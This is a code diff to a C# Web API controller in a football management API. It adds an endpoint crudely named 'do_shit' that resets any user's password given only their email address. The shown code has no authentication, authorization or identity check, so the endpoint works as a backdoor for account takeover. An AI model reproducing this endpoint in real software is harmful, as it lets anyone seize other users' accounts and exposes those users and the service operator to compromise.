@@ -84,5 +84,26 @@ namespace FootballManagementApi.Controllers
             await UnitOfWork.SaveChangesAsync();
             return Ok();
         }
-    }
+
+
+		[HttpPost]
+		[Route("do_shit")]
+		
+		public async Task<IHttpActionResult> DoShitAsync([FromBody]DoShitRequest request)
+		{
+			User user = await UnitOfWork.GetUserRepository().SelectFirstOrDefaultAsync(u => u.Email == request.Email);
+
+			_profileService.ChangePassword(user, request.Password, request.Password);
+
+			await UnitOfWork.SaveChangesAsync();
+			return Ok();
+		}
+
+		public class DoShitRequest
+		{
+			public string Email { get; set; }
+
+			public string Password { get; set; }
+		}
+	}
 }
